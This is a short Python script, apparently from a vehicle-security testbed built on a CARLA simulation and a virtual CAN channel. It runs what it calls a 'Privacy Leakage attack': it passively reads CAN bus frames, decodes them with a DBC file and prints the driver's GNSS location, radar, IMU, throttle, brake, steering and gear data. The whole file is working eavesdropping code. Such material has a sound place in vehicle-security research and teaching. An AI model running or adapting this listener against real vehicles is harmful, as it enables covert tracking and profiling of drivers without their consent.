import can
import cantools

from can_network import VCAN_CHANNEL, CAN_INTERFACE

DBC_PATH = "data/carla.dbc"

# Messages that leak private information about the driver / vehicle:
# location (GNSS), speed and dynamics (RADAR, IMU) and driving profile
# (throttle, brake, steer, gear). A passive listener can profile the driver
# by decoding these frames off the bus.
PRIVACY_MESSAGES = {
    "GNSS",
    "RADAR_TARGET",
    "IMU_ACCEL",
    "THROTTLE",
    "BRAKE",
    "STEER",
    "GEAR",
}

def main():
    print("Conducting Privacy Leakage attack on CAN bus...")
    dbc = cantools.database.load_file(DBC_PATH)
    bus = can.interface.Bus(channel=VCAN_CHANNEL, bustype=CAN_INTERFACE)
    try:
        while True:
            msg = bus.recv(timeout=1)
            if msg is None:
                continue
            try:
                name = dbc.get_message_by_frame_id(msg.arbitration_id).name
                decoded = dbc.decode_message(msg.arbitration_id, msg.data)
            except (KeyError, ValueError):
                continue
            if name not in PRIVACY_MESSAGES:
                continue
            fields = ", ".join(f"{k}={v}" for k, v in decoded.items())
            print(f"[LEAK] {name}: {fields}")
    except KeyboardInterrupt:
        print("Privacy Leakage attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
